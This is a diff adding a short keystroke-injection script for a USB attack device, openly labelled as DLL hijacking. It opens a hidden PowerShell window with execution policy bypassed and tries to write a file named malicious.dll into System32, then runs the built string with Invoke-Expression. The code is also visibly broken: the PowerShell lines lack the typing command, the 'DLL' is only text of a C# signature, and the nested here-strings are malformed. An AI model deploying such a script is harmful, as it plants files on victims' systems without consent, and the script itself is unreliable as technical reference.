@@ -1,0 +1,19 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM DLL hijacking
+$string = @"
+`$dllPath = "$env:SYSTEMROOT\System32\malicious.dll"
+`$maliciousDll = @"
+`[DllImport("kernel32.dll")]
+public static extern IntPtr LoadLibrary(string lpLibFileName);
+"@
+`$bytes = [System.Text.Encoding]::UTF8.GetBytes($maliciousDll)
+`$bytes | Out-File -FilePath $dllPath -Encoding Byte
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
